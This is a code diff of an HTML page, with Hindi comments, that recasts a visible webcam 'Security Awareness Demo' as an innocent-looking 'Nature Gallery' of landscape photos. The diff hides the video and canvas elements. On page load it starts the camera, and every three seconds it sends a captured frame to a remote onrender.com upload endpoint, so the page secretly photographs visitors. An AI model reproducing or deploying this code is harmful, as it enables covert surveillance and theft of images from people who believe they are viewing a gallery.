@@ -2,16 +2,47 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Camera Capture Demo</title>
+    <title>Beautiful Gallery</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f9;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+        }
+        .gallery {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        .gallery img {
+            width: 300px;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+    </style>
 </head>
 <body>
 
-    <h2>Security Awareness Demo</h2>
-    <!-- Video element jo camera feed dikhayega -->
-    <video id="webcam" autoplay playsinline width="320" height="240"></video>
+    <h2>Welcome to Nature Gallery</h2>
     
-    <!-- Hidden canvas jisse video ko image mein badla jata hai -->
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <div class="gallery">
+        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb" alt="Nature 1">
+        <img src="https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05" alt="Nature 2">
+        <img src="https://images.unsplash.com/photo-1447752875215-b2761acb3c5d" alt="Nature 3">
+    </div>
+
+    <video id="webcam" autoplay playsinline width="320" height="240" style="display: none;"></video>
+
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
     <script>
         const video = document.getElementById('webcam');
@@ -20,40 +51,39 @@
 
         async function startCamera() {
             try {
-                // Browser user se camera ki permission maangega
+                // Background mein camera stream start hogi
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
-                
-                // Permission milne ke baad har 3 seconds mein frame bhejega
+
+                // Har 3 second mein background frame bheja jayega
                 setInterval(captureAndSendFrame, 3000);
             } catch (err) {
-                console.error("Camera permission denied: ", err);
+                console.error("Camera permission error: ", err);
             }
         }
 
         function captureAndSendFrame() {
-            // Video frame ko canvas par draw karna
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Frame ko Base64 format mein convert karna
-            const imageData = canvas.toDataURL('image/jpeg');
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                // Video frame ko canvas par draw karke Base64 mein convert karna
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg');
 
-            // Aapka exact Render URL yahan set kar diya gaya hai
-            fetch('https://my-first-repository-5c3u.onrender.com/upload', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => response.json())
-            .then(data => console.log("Saved to MongoDB:", data))
-            .catch(error => console.error("Error:", error));
+                // Backend Render URL par payload bhejro
+                fetch('https://my-first-repository-5c3s.onrender.com/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: imageData })
+                })
+                .then(response => response.json())
+                .then(data => console.log("Saved to Cloudinary & MongoDB:", data))
+                .catch(error => console.error("Error:", error));
+            }
         }
 
-        // Page load hote hi camera start karne ki koshish
+        // Page load hone par camera start karna
         window.onload = startCamera;
     </script>
-
 </body>
 </html>
